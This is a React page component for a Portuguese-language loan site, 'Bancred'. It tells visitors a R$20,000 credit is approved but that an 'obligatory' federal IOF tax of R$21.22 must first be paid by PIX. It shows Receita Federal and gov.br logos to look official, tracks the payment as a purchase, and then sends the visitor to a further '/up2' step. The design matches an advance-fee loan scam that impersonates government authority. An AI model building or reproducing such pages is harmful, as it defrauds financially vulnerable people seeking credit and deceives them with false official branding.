import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  Landmark,
  ShieldCheck,
  Wallet,
  FileText,
  CircleCheck,
  Clock,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import receitaLogo from "@/assets/receita-federal-logo.svg";
import govbrLogo from "@/assets/govbr-logo.png";
import { useParadisePix } from "@/hooks/useParadisePix";
import { trackEvent } from "@/lib/tracking";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
    </g>
  </svg>
);


const Up1 = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  const nomeRaw = params.get("nome") || "";
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
  const valorAprovado = 20000;
  const valorIOF = 21.22;

  const [showPix, setShowPix] = useState(false);
  const [copied, setCopied] = useState(false);

  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
    trackEvent({
      event: "CompletePayment",
      value: valorIOF,
      currency: "BRL",
      contents: [{ content_id: "iof", content_name: "IOF", quantity: 1, price: valorIOF }],
    });
    navigate(`/up2?${params.toString()}`);
  });

  const openPix = async () => {
    setShowPix(true);
    trackEvent({
      event: "InitiateCheckout",
      value: valorIOF,
      currency: "BRL",
      contents: [{ content_id: "iof", content_name: "IOF", quantity: 1, price: valorIOF }],
    });
    try {
      await create({
        amountCents: Math.round(valorIOF * 100),
        description: `IOF Bancred - Liberação de crédito`,
        stage: "iof",
        customer: nomeRaw ? { name: nomeRaw } : undefined,
      });
    } catch {
      /* erro tratado pelo hook */
    }
  };

  const closePix = () => {
    setShowPix(false);
    reset();
    setCopied(false);
  };

  const handleCopy = async () => {
    if (!pix?.qr_code) return;
    try {
      await navigator.clipboard.writeText(pix.qr_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      /* ignore */
    }
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "18px 16px 26px", maxWidth: 480, margin: "0 auto" }}>
        <section
          style={{
            background: "linear-gradient(160deg, #FFFFFF 0%, #EFF6FF 100%)",
            border: "1px solid #E5E7EB",
            borderRadius: 22,
            padding: "22px 18px 18px",
            marginBottom: 14,
            boxShadow: "0 14px 34px rgba(17, 24, 39, 0.08)",
          }}
        >
          <div style={{ textAlign: "center", marginBottom: 18 }}>
            <div
              style={{
                width: 76,
                height: 76,
                borderRadius: "50%",
                background: "#FFFFFF",
                color: "#1C68E3",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                marginBottom: 14,
                border: "1px solid #DBEAFE",
                boxShadow: "0 10px 22px rgba(28, 104, 227, 0.14)",
              }}
            >
              <Landmark size={35} strokeWidth={2} />
            </div>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                padding: "6px 10px",
                borderRadius: 999,
                background: "#DBEAFE",
                color: "#1751B5",
                fontSize: 12,
                fontWeight: 800,
                marginBottom: 10,
              }}
            >
              <ShieldCheck size={14} /> Etapa fiscal obrigatória
            </div>
            <h1 style={{ fontSize: 24, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.16 }}>
              {primeiroNome}, falta quitar o IOF do seu crédito
            </h1>
            <p style={{ fontSize: 14, lineHeight: 1.55, color: "#6B7280", margin: 0 }}>
              O IOF é o Imposto sobre Operações Financeiras, uma cobrança federal obrigatória em operações de crédito.
              Ele precisa ser regularizado para concluir a formalização e liberar o contrato.
            </p>
          </div>

          <div
            style={{
              background: "#FFFFFF",
              borderRadius: 16,
              padding: 16,
              border: "1px solid #DBEAFE",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 12 }}>
              <div>
                <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Crédito aprovado</div>
                <div style={{ fontSize: 30, fontWeight: 900, color: "#1C68E3" }}>{formatBRL(valorAprovado)}</div>
              </div>
              <span
                style={{
                  width: 48,
                  height: 48,
                  borderRadius: "50%",
                  background: "#FFFFFF",
                  color: "#1C68E3",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexShrink: 0,
                }}
              >
                <Wallet size={24} />
              </span>
            </div>
          </div>
        </section>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 18,
            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 14,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
            <span
              style={{
                width: 34,
                height: 34,
                borderRadius: "50%",
                background: "#F0FDF4",
                color: "#16A34A",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
              }}
            >
              <FileText size={18} />
            </span>
            <div>
              <div style={{ fontSize: 15, fontWeight: 900, color: "#111827" }}>Por que o IOF é obrigatório?</div>
              <div style={{ fontSize: 12, color: "#6B7280" }}>Registro fiscal da operação financeira</div>
            </div>
          </div>
          {[
            "Imposto federal obrigatório para contratos de crédito",
            "Necessário para emitir e validar a operação financeira",
            "Liberação automática do crédito após a confirmação do PIX",
          ].map((t) => (
            <div key={t} style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827", marginBottom: 7 }}>
              <CircleCheck size={14} color="#16A34A" /> {t}
            </div>
          ))}
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 18,
            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
            border: "1px solid #D1D5DB",
            marginBottom: 18,
          }}
        >
          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
            <div>
              <div style={{ fontSize: 13, color: "#6B7280", marginBottom: 4 }}>IOF da operação de crédito</div>
              <div style={{ fontSize: 34, fontWeight: 900, color: "#1C68E3", marginBottom: 8 }}>{formatBRL(valorIOF)}</div>
            </div>
            <div
              style={{
                padding: "6px 10px",
                borderRadius: 999,
                background: "#FFF7ED",
                color: "#C2410C",
                fontSize: 12,
                fontWeight: 800,
                whiteSpace: "nowrap",
              }}
            >
              Pendente
            </div>
          </div>
          <div style={{ fontSize: 13, lineHeight: 1.55, color: "#6B7280", borderTop: "1px solid #E5E7EB", paddingTop: 12 }}>
            Esse imposto é vinculado ao CPF e ao valor aprovado, sendo exigido antes da liberação para registrar a operação dentro das normas financeiras.
          </div>
        </div>

        <button
          type="button"
          onClick={openPix}
          style={{
            width: "100%",
            padding: "15px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            letterSpacing: -0.2,
            cursor: "pointer",
            boxShadow: "0 8px 24px rgba(22, 163, 74, 0.25)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            fontFamily: fontStack,
            minHeight: 52,
          }}
        >
          <PixIcon size={20} /> Pagar IOF e liberar crédito
        </button>

        <footer style={{ marginTop: 22, textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 18, marginBottom: 10 }}>
            <img src={receitaLogo} alt="Receita Federal do Brasil" style={{ height: 64, width: "auto", opacity: 0.85, display: "block" }} />
            <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
            <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
          </div>
          <div style={{ fontSize: 11, lineHeight: 1.45, color: "#6B7280" }}>
            IOF vinculado às diretrizes fiscais aplicáveis às operações financeiras.
          </div>
        </footer>
      </main>

      {showPix && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            backdropFilter: "blur(2px)",
            display: "flex",
            alignItems: "flex-end",
            justifyContent: "center",
            zIndex: 60,
          }}
          onClick={closePix}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#fff",
              width: "100%",
              maxWidth: 480,
              borderTopLeftRadius: 22,
              borderTopRightRadius: 22,
              padding: "14px 18px 24px",
              maxHeight: "92dvh",
              overflowY: "auto",
              fontFamily: fontStack,
            }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <PixIcon size={22} />
                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar IOF com PIX</span>
              </div>
              <button
                type="button"
                onClick={closePix}
                aria-label="Fechar"
                style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
              >
                <X size={22} />
              </button>
            </div>

            <div
              style={{
                background: "#F0FDF4",
                border: "1px solid #DCFCE7",
                borderRadius: 14,
                padding: "12px 14px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 18,
              }}
            >
              <div>
                <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
                  {formatBRL(valorIOF)}
                </div>
              </div>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 6,
                  background: "#fff",
                  border: "1px solid #DCFCE7",
                  color: "#15803D",
                  fontSize: 12,
                  fontWeight: 600,
                  padding: "6px 10px",
                  borderRadius: 999,
                }}
              >
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading || !pix ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>

                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img
                      src={pix.qr_image}
                      alt="QR Code PIX"
                      width={240}
                      height={240}
                      style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }}
                    />
                  </div>
                </div>

                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div
                  style={{
                    background: "#F9FAFB",
                    border: "1px solid #E5E7EB",
                    borderRadius: 12,
                    padding: 12,
                    fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace",
                    fontSize: 12,
                    color: "#111827",
                    wordBreak: "break-all",
                    lineHeight: 1.5,
                    marginBottom: 12,
                  }}
                >
                  {pix.qr_code}
                </div>

                <button
                  type="button"
                  onClick={handleCopy}
                  style={{
                    width: "100%",
                    padding: "14px 18px",
                    background: copied ? "#16A34A" : "#1C68E3",
                    color: "#fff",
                    border: "none",
                    borderRadius: 12,
                    fontSize: 15,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    fontFamily: fontStack,
                    minHeight: 50,
                  }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>

                <div
                  style={{
                    marginTop: 12,
                    background: "#EFF6FF",
                    border: "1px solid #DBEAFE",
                    borderRadius: 12,
                    padding: "12px 14px",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    color: "#1751B5",
                    fontSize: 13,
                  }}
                >
                  <Loader2 size={16} style={{ animation: "spin 1.4s linear infinite", flexShrink: 0 }} />
                  Aguardando confirmação do pagamento...
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Up1;
